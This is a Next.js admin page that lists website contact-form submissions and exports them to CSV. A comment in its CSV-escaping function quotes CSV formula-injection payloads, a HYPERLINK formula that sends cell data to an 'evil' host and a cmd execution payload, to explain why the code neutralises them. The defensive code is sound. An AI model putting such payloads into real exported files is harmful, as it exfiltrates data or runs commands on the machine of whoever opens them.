"use client";

import { useCallback, useEffect, useMemo, useState } from "react";
import { useSession } from "next-auth/react";
import Header from "@/components/admin/Header";
import FormNotifications from "@/components/admin/FormNotifications";
import { cn } from "@/lib/utils";
import { Loader2, Trash2, Download, MailOpen, Inbox } from "lucide-react";

interface Submission {
  id: number;
  formName: string;
  pagePath: string | null;
  data: Record<string, string>;
  isRead: boolean;
  ip: string | null;
  createdAt: string;
}

export default function FormsPage() {
  const [rows, setRows] = useState<Submission[] | null>(null);
  const [unread, setUnread] = useState(0);
  const [selected, setSelected] = useState<number | null>(null);
  const [filter, setFilter] = useState<"all" | "unread">("all");
  const [form, setForm] = useState("all");
  // Editors read and mark read; deleting is an administrator's (the API
  // refuses it), so the delete buttons are not shown to them at all.
  const { data: session } = useSession();
  const canDelete = (session?.user as { role?: string } | undefined)?.role === "admin";

  const load = useCallback(async () => {
    const res = await fetch("/api/forms");
    if (!res.ok) { setRows([]); return; }
    const data = await res.json();
    setRows(data.submissions ?? []);
    setUnread(data.unread ?? 0);
  }, []);

  useEffect(() => { void load(); }, [load]);

  const formNames = useMemo(
    () => Array.from(new Set((rows ?? []).map((r) => r.formName))).sort(),
    [rows]
  );

  const visible = useMemo(
    () => (rows ?? []).filter(
      (r) => (filter === "all" || !r.isRead) && (form === "all" || r.formName === form)
    ),
    [rows, filter, form]
  );

  const current = visible.find((r) => r.id === selected) ?? null;

  /** Opening a message marks it read — the list is the only unread signal. */
  const open = async (row: Submission) => {
    setSelected(row.id);
    if (row.isRead) return;
    setRows((prev) => prev?.map((r) => (r.id === row.id ? { ...r, isRead: true } : r)) ?? prev);
    setUnread((n) => Math.max(0, n - 1));
    const res = await fetch(`/api/forms/${row.id}`, {
      method: "PATCH",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ isRead: true }),
    }).catch(() => null);
    // Show the real state again rather than "read" when it is not.
    if (!res?.ok) void load();
  };

  const remove = async (id: number) => {
    if (!window.confirm("Delete this submission? This cannot be undone.")) return;
    const res = await fetch(`/api/forms/${id}`, { method: "DELETE" }).catch(() => null);
    if (!res?.ok) window.alert("That submission could not be deleted. Please try again.");
    else if (selected === id) setSelected(null);
    void load();
  };

  const bulk = async (action: "read_all" | "delete_read") => {
    if (action === "delete_read" && !window.confirm("Delete every submission you've already read?")) return;
    const res = await fetch("/api/forms", {
      method: "PATCH",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ action }),
    }).catch(() => null);
    if (!res?.ok) window.alert(action === "read_all" ? "Could not mark them read. Please try again." : "Could not clear them. Please try again.");
    setSelected(null);
    void load();
  };

  /** CSV of what's on screen, so the current filter is what gets exported. */
  const exportCsv = () => {
    const keys = Array.from(new Set(visible.flatMap((r) => Object.keys(r.data ?? {}))));
    /**
     * One CSV cell.
     *
     * The leading apostrophe is not decoration. Every value here was typed by
     * a stranger into a public form, and Excel, LibreOffice and Google Sheets
     * treat a cell starting with `=`, `+`, `-` or `@` as a FORMULA — so
     * `=HYPERLINK("http://evil/"&A1)` or a `=cmd|…` payload runs when the
     * owner opens their own submissions. Quoting alone does not stop it; the
     * quotes are stripped before the formula is parsed. Prefixing with `'`
     * forces the cell to text, and spreadsheets hide the apostrophe.
     *
     * Tab, carriage return and newline get the same treatment, because a
     * leading one lets the payload hide off the visible edge of the cell.
     */
    const esc = (v: string) => {
      const text = String(v ?? "");
      const dangerous = /^[=+\-@\t\r\n]/.test(text);
      return `"${(dangerous ? `'${text}` : text).replace(/"/g, '""')}"`;
    };
    const header = ["date", "form", "page", ...keys].map(esc).join(",");
    const lines = visible.map((r) =>
      [
        new Date(r.createdAt).toISOString(),
        r.formName,
        r.pagePath ?? "",
        ...keys.map((k) => r.data?.[k] ?? ""),
      ].map(esc).join(",")
    );
    // The BOM is what makes Excel read the file as UTF-8. Without it Excel
    // assumes the system codepage and every Arabic, Hebrew or accented
    // submission opens as mojibake — the data is fine, the file just looks
    // corrupted, which is worse because people believe it.
    const BOM = "﻿";
    const blob = new Blob([BOM + [header, ...lines].join("\r\n")], { type: "text/csv;charset=utf-8" });
    const a = document.createElement("a");
    a.href = URL.createObjectURL(blob);
    a.download = `form-submissions-${new Date().toISOString().slice(0, 10)}.csv`;
    a.click();
    URL.revokeObjectURL(a.href);
  };

  if (!rows) {
    return (
      <>
        <Header title="Forms" />
        <div className="p-8 flex items-center gap-2 text-sm text-slate-500">
          <Loader2 size={16} className="animate-spin" /> Loading submissions…
        </div>
      </>
    );
  }

  return (
    <>
      <Header title="Forms" />
      <div className="p-8 max-w-[1200px]">
        {/* Above the inbox on purpose: the first question anyone has on this
            screen is "will I be told when something arrives?", and until now
            the honest answer was no. */}
        <div className="mb-6">
          <FormNotifications />
        </div>

        <div className="flex flex-wrap items-center gap-3 mb-5">
          <div className="flex border border-slate-200 rounded-lg overflow-hidden">
            {(["all", "unread"] as const).map((f) => (
              <button
                key={f}
                onClick={() => { setFilter(f); setSelected(null); }}
                className={cn(
                  "px-3 py-1.5 text-sm transition-colors",
                  filter === f ? "bg-brand-600 text-white" : "bg-white text-slate-600 hover:bg-slate-50"
                )}
              >
                {f === "all" ? "All" : `Unread${unread ? ` (${unread})` : ""}`}
              </button>
            ))}
          </div>

          {formNames.length > 1 && (
            <select
              value={form}
              onChange={(e) => { setForm(e.target.value); setSelected(null); }}
              className="px-2.5 py-1.5 rounded-lg border border-slate-200 text-sm text-slate-700"
            >
              <option value="all">Every form</option>
              {formNames.map((n) => <option key={n} value={n}>{n}</option>)}
            </select>
          )}

          <div className="ml-auto flex items-center gap-2">
            <button onClick={exportCsv} disabled={visible.length === 0}
              className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg border border-slate-200 text-sm text-slate-600 hover:bg-slate-50 disabled:opacity-40">
              <Download size={14} /> Export CSV
            </button>
            <button onClick={() => bulk("read_all")} disabled={unread === 0}
              className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg border border-slate-200 text-sm text-slate-600 hover:bg-slate-50 disabled:opacity-40">
              <MailOpen size={14} /> Mark all read
            </button>
            {canDelete && (
              <button onClick={() => bulk("delete_read")}
                className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg border border-slate-200 text-sm text-slate-500 hover:bg-red-50 hover:text-red-600 hover:border-red-200">
                <Trash2 size={14} /> Clear read
              </button>
            )}
          </div>
        </div>

        {rows.length === 0 ? (
          <div className="border-2 border-dashed border-slate-200 rounded-xl py-20 text-center">
            <Inbox size={28} className="mx-auto text-slate-300 mb-3" />
            <p className="text-sm text-slate-500">No submissions yet.</p>
            <p className="text-xs text-slate-400 mt-1">
              Add a Contact Form block to a page and messages will land here.
            </p>
          </div>
        ) : (
          <div className="flex gap-5 items-start">
            <div className="w-[340px] shrink-0 border border-slate-200 rounded-xl bg-white overflow-hidden max-h-[70vh] overflow-y-auto">
              {visible.length === 0 ? (
                <p className="text-sm text-slate-400 text-center py-10">Nothing matches that filter.</p>
              ) : (
                visible.map((r) => (
                  <button
                    key={r.id}
                    onClick={() => open(r)}
                    className={cn(
                      "w-full text-left px-3.5 py-3 border-b border-slate-100 last:border-b-0 transition-colors",
                      selected === r.id ? "bg-brand-50" : "hover:bg-slate-50"
                    )}
                  >
                    <div className="flex items-center gap-2">
                      {!r.isRead && <span className="w-1.5 h-1.5 rounded-full bg-brand-500 shrink-0" aria-label="Unread" />}
                      <span className={cn("text-sm truncate", r.isRead ? "text-slate-600" : "font-semibold text-slate-800")}>
                        {r.data?.name || r.data?.email || r.formName}
                      </span>
                      <span className="ml-auto text-[10px] text-slate-400 shrink-0">
                        {new Date(r.createdAt).toLocaleDateString("en-GB", { day: "numeric", month: "short" })}
                      </span>
                    </div>
                    <p className="text-xs text-slate-500 truncate mt-0.5">
                      {Object.values(r.data ?? {}).find((v) => String(v).length > 2) ?? "—"}
                    </p>
                  </button>
                ))
              )}
            </div>

            <div className="flex-1 min-w-0 border border-slate-200 rounded-xl bg-white p-6 min-h-[300px]">
              {!current ? (
                <p className="text-sm text-slate-400 text-center py-20">Pick a submission to read it.</p>
              ) : (
                <>
                  <div className="flex items-start justify-between gap-4 pb-4 mb-4 border-b border-slate-100">
                    <div>
                      <p className="text-sm font-semibold text-slate-800">{current.formName}</p>
                      <p className="text-xs text-slate-400 mt-0.5">
                        {new Date(current.createdAt).toLocaleString("en-GB")}
                        {current.pagePath && <> · from <span className="font-mono">{current.pagePath}</span></>}
                        {current.ip && <> · {current.ip}</>}
                      </p>
                    </div>
                    {canDelete && (
                      <button onClick={() => remove(current.id)}
                        className="shrink-0 inline-flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg text-xs text-slate-500 hover:bg-red-50 hover:text-red-600">
                        <Trash2 size={13} /> Delete
                      </button>
                    )}
                  </div>

                  <dl className="space-y-3.5">
                    {Object.entries(current.data ?? {}).map(([k, v]) => (
                      <div key={k}>
                        <dt className="text-[11px] font-semibold uppercase tracking-wide text-slate-400">
                          {k.replace(/_/g, " ")}
                        </dt>
                        <dd className="text-sm text-slate-700 whitespace-pre-line mt-0.5 break-words">
                          {/^[^\s@]+@[^\s@]+$/.test(v)
                            ? <a href={`mailto:${v}`} className="text-brand-700 hover:underline">{v}</a>
                            : v}
                        </dd>
                      </div>
                    ))}
                  </dl>
                </>
              )}
            </div>
          </div>
        )}
      </div>
    </>
  );
}
